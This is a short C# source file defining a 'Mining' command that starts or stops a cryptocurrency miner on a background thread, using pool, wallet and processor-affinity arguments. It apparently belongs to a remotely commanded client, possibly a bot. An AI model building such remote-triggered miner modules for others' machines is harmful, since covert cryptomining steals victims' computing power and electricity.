using System;
using System.Threading;
using System.Threading.Tasks;

namespace Client.Commands
{
    class Mining : Command
    {

        public Mining(string name) : base(name) { }

        public override string execute(string[] args)
        {

            if (args.Length == 0) return "Expected argument for mining";
            if (args[0] == "stop")
            {

                MiningLogic miningLogic = new MiningLogic();
                Task miningTask = miningLogic.StopMining();
                return $"Mining stoped";
            }
            else
            {
                try
                {
                    new Thread(() =>
                    {
                        try
                        {
                            string workerName = "c#client";
                            MiningLogic miningLogic = new MiningLogic();
                            Task miningTask = miningLogic.StartMiningAsync(Client.MinerPath, args[0], args[1], workerName, Int32.Parse(args[2]));
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine(e.Message);
                        }
                    }).Start();
                    return $"Mining started";
                }
                catch (Exception e)
                {
                    return e.Message;
                }
            }
        }
    }
}
// mining pool Wallet processorAffinityPercentage